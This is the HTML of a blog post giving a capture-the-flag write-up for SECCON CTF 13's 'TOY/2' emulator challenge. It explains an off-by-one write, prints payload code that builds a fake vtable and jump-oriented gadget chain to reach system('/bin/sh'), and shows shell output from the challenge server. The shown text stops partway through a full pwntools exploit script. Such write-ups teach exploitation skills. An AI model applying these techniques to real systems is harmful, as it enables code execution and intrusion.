@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  TOY/2 - SECCON CTF 13 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Leakless vm escape using an off-by-one bug">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="TOY/2 - SECCON CTF 13">
+	<meta name="twitter:description" content="Leakless vm escape using an off-by-one bug">
+
+<meta property="og:url" content="http://localhost:1313/posts/seccon_toy2/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="TOY/2 - SECCON CTF 13">
+	<meta property="og:description" content="Leakless vm escape using an off-by-one bug">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2024-11-24T14:53:47+01:00">
+		<meta property="article:modified_time" content="2024-11-24T14:53:47+01:00">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Vm">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/seccon_toy2/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/seccon_toy2/">
+              TOY/2 - SECCON CTF 13
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-11-24T14:53:47&#43;01:00">
+                November 24, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/vm/">Vm</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <h2 id="toy2">
+  <strong>TOY/2:</strong>
+  <a class="heading-link" href="#toy2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>This weekend we played as P1G SEKAI and managed to qualify to the finals. TOY/2 was a challenge I solved.</p>
+<p>In this challenge we&rsquo;re given a C++ binary that emulates some 16-bit architecture.</p>
+<p>It had several instructions, one of them included an OOB bug:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">13</span><span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#8b949e;font-style:italic">/* STT */</span>
+</span></span><span style="display:flex;"><span>    mem_write(_regs.a <span style="color:#ff7b72;font-weight:bold">&amp;</span> (size() <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>), _regs.t);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">break</span>;
+</span></span></code></pre></div><p>This is bad code, since we write two bytes but the <code>AND</code> let&rsquo;s us place those one byte before the emulator memory ends → one-byte OOB write.</p>
+<p>The memory uses <code>std::span&lt;uint8_t&gt;</code>, which has a pointer to the start of data right after its contents. We can elevate our OOB privileges to also change the size of <code>_mem</code> to bypass checks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## overwrite ptr </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16((<span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A</span><span style="color:#79c0ff">\xd8</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x6</span>) <span style="color:#8b949e;font-style:italic"># 0x8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## padding and jump after move backward</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">11</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x30</span>) <span style="color:#8b949e;font-style:italic"># 0x2e</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x50</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## set length and corrupt ptr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x12</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1c</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfe8</span>) <span style="color:#8b949e;font-style:italic"># 0x14</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8000</span>) <span style="color:#8b949e;font-style:italic"># 0x16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfdf</span>) <span style="color:#8b949e;font-style:italic"># 0x18</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A</span><span style="color:#79c0ff">\xb0</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x16</span>) <span style="color:#8b949e;font-style:italic"># 0x1c</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x14</span>) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x18</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span></code></pre></div><p>With this we can also access data before <code>_mem</code>, which luckily contains a vtable pointer. This is called if we trigger an exception for example. Given the vtable (PIE) address and the heap address we&rsquo;re able to retrieve, we can create a fake vtable on the heap and call whatever we want in the binary! I decided to call <code>_start</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## craft jumptable</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x56</span>) <span style="color:#8b949e;font-style:italic"># 0x54</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x6e</span>) <span style="color:#8b949e;font-style:italic"># 0x56</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1008</span>) <span style="color:#8b949e;font-style:italic"># 0x58 # heap</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x100a</span>) <span style="color:#8b949e;font-style:italic"># 0x5a</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x100c</span>) <span style="color:#8b949e;font-style:italic"># 0x5c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x0</span>) <span style="color:#8b949e;font-style:italic"># 0x5e # vtable</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x2</span>) <span style="color:#8b949e;font-style:italic"># 0x60</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4</span>) <span style="color:#8b949e;font-style:italic"># 0x62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4000</span>) <span style="color:#8b949e;font-style:italic"># 0x64 # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4002</span>) <span style="color:#8b949e;font-style:italic"># 0x66</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4004</span>) <span style="color:#8b949e;font-style:italic"># 0x68</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x2020</span>) <span style="color:#8b949e;font-style:italic"># 0x6a # off _start</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ff8</span>) <span style="color:#8b949e;font-style:italic"># 0x6c # off heap</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x0</span>) <span style="color:#8b949e;font-style:italic"># 0x6e</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x6a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x64</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x66</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x68</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x58</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _adc(<span style="color:#a5d6ff">0x6c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5e</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x60</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x62</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ill()
+</span></span></code></pre></div><p>Why do we call <code>_start</code>? We don&rsquo;t have good gadgets in the binary to do anything useful. However before we get another shot to input a program, there will be some <code>libstdc++</code> pointers on the heap. With a bit of work, we can also use them to calculate some gadgets and creating another fake vtable.</p>
+<p>I decided to do some JOP, since we had control over the memory (vtable) pointed to by <code>rax</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a5d6ff">1</span><span style="color:#ff7b72;font-weight:bold">:</span> mov r13, rax ; mov rax, qword ptr [rdi] ; call qword ptr [rax <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x40</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span><span style="color:#ff7b72;font-weight:bold">:</span> mov rdi, r13 ; call qword ptr [rax <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x48</span>]
+</span></span></code></pre></div><p>They worked quite well, since first (and only) vtable entry is called like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;</span>main<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">463</span><span style="color:#ff7b72;font-weight:bold">&gt;:</span>	call   QWORD PTR [rax<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x8</span>]
+</span></span></code></pre></div><p>The only thing left is to place stuff correctly:</p>
+<ul>
+<li><code>[rax]</code>: <code>/bin/sh</code> string</li>
+<li><code>[rax+0x8]</code>: gadget 1 (see above)</li>
+<li><code>[rax+0x40]</code>: gadget 2</li>
+<li><code>[rax+0x48]</code>: <code>system()</code> address</li>
+</ul>
+<p>This successfully calls <code>system(&quot;/bin/sh&quot;)</code> and we can read the flag.</p>
+<pre tabindex="0"><code>root@bitpc:/pwd/Downloads/seccon# python3 x.py 
+[+] Opening connection to toy-2.seccon.games on port 5000: Done
+[*] Switching to interactive mode
+[+] Running...
+[-] Error: Illegal instruction
+[+] Done.
+[+] Running...
+[-] Error: Illegal instruction
+[+] Done.
+$ cat /flag*
+SECCON{Im4g1n3_pWn1n6_1n51d3_a_3um_CM0S}
+$
+</code></pre><p>(Note: on remote the offset from <code>libc</code> to <code>libstdc++</code> didn&rsquo;t match the local offset, so a little bruteforce was needed)</p>
+<p>Full exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_jmp</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_adc</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_xor</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x2</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_sbc</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x3</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_ror</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x4</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_tat</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x5</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_or</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x6</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_ill</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x7</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_and</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x8</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_ldc</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0x9</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_bcc</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xa</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_bne</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xb</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_ldi</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xc</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_stt</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xd</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_lda</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xe</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">_sta</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p16((<span style="color:#a5d6ff">0xf</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">|</span> (addr <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
